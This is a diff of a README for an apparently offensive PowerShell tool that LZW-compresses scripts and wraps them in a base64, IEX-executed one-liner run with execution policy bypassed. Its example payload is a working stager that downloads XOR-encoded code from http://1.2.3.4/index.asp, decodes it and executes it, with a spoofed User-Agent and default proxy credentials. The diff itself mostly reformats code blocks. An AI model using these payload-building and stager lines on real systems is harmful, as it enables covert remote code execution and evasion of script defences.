@@ -77,27 +77,27 @@ To use LZW it's simple :
 1/ Declare functions (or import-module PoshLZW.ps1)
 
 ```PS> $m_=[math];
-PS> function bs{...
-PS> function bw{...
-PS> function lzwc{...
+$ PS > function bs{...
+$ PS > function bw{...
+$ PS > function lzwc{...
 ```
 
 
 2/ compress your powershell script :
 
 ```PS> $MyScript = "write-host 'Hello World';";
-PS> $lz = lzwc $MyScript 10;
+$ PS > $lz = lzwc $MyScript 10;
 ```
 
 3/ encode the compressed script in base64
-```PS> $lz64 = [convert]::ToBase64String($lz);
+```$ PS > $lz64 = [convert]::ToBase64String($lz);
 ```
 
 
 4/ Build the payload with the overhead :
 ```PS> $payload = '$m_=[math];';
-PS> $payload+= 'function bs{...' + 'function br{...' + 'function lzwd{...';
-PS> $payload+= 'IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lz64+'"))))';
+$ PS > $payload+= 'function bs{...' + 'function br{...' + 'function lzwd{...';
+$ PS > $payload+= 'IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lz64+'"))))';
 ```
 
 Then you can execute the payload with #>powershell -nop -noni -ex bypass -c here-the-payload.
@@ -147,21 +147,22 @@ Example
 -------
 
 Stats
-    $ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
-    $ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("stager.ps1"));
-    $ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("agent.ps1"));
-    $ PS > write-host "|                 Text   |" $text.length
-    $ PS > write-host "|             B64(Text)  |" ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))).length
-    $ PS > foreach ($i in 9..15){
-    $ PS > 	$lzw = lzwc $text $i;
-    $ PS > 	write-host "|           LZW(T,$i)  |" $lzw.length;
-    $ PS > 	$64lzw = [convert]::ToBase64String($lzw);
-    $ PS > 	$overhead='$m_=[math];function bs{param($v,$s)return $m_::Floor($v*$m_::Pow(2,-$s))}function br{param($o,$c,$a)$p=$i=$e=0;$j=$m_::floor(($t=$a.value)*$c/8);$s=($r=8-(($t*$c)%8))-$c;$b=$m_::Pow(2,$c)-1;while($e-lt$c){$p=$p-bor((bs $o[$j+$i] $s)-band$b);$e+=$r;$r=$m_::max($r,8);$s+=8;$i++}$a.value++;return $p}';
-    $ PS > function lzwd{param($p)$a=$j=0;$v=@();$e=$o="";$c=$p[0];$p=$p[1..$p.length];foreach($i in 0..255){$v+=[string]([char]$i)}$o+=($w=[string]$v[($j=br $p $c ([ref]$a))]);while([math]::floor($a*$c/8)-lt($p.length-1)){$l=$v.count;$j=br $p $c ([ref]$a);$o+=$v[$j];if($j-lt$l){$e=[string]$v[$j]}elseif($j-eq$l){$e=$w+$w[0]}$v+=$w+$e[0];$w=$e}return $o;}IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lzw+'"))))';
-    $ PS > 	write-host "|     H+B64(LZW(T,$i)  |" $overhead.length;
-    $ PS > 	$b64hz = [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($overhead));
-    $ PS > 	write-host "| B64(H+B64(LZW(T,$i)) |" $b64hz.length;
-    $ PS > }
+````$ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
+$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("stager.ps1"));
+$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("agent.ps1"));
+$ PS > write-host "|                 Text   |" $text.length
+$ PS > write-host "|             B64(Text)  |" ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))).length
+$ PS > foreach ($i in 9..15){
+$ PS > 	$lzw = lzwc $text $i;
+$ PS > 	write-host "|           LZW(T,$i)  |" $lzw.length;
+$ PS > 	$64lzw = [convert]::ToBase64String($lzw);
+$ PS > 	$overhead='$m_=[math];function bs{param($v,$s)return $m_::Floor($v*$m_::Pow(2,-$s))}function br{param($o,$c,$a)$p=$i=$e=0;$j=$m_::floor(($t=$a.value)*$c/8);$s=($r=8-(($t*$c)%8))-$c;$b=$m_::Pow(2,$c)-1;while($e-lt$c){$p=$p-bor((bs $o[$j+$i] $s)-band$b);$e+=$r;$r=$m_::max($r,8);$s+=8;$i++}$a.value++;return $p}';
+$ PS > function lzwd{param($p)$a=$j=0;$v=@();$e=$o="";$c=$p[0];$p=$p[1..$p.length];foreach($i in 0..255){$v+=[string]([char]$i)}$o+=($w=[string]$v[($j=br $p $c ([ref]$a))]);while([math]::floor($a*$c/8)-lt($p.length-1)){$l=$v.count;$j=br $p $c ([ref]$a);$o+=$v[$j];if($j-lt$l){$e=[string]$v[$j]}elseif($j-eq$l){$e=$w+$w[0]}$v+=$w+$e[0];$w=$e}return $o;}IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lzw+'"))))';
+$ PS > 	write-host "|     H+B64(LZW(T,$i)  |" $overhead.length;
+$ PS > 	$b64hz = [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($overhead));
+$ PS > 	write-host "| B64(H+B64(LZW(T,$i)) |" $b64hz.length;
+$ PS > }
+````
 
 Last word ?
 -----------
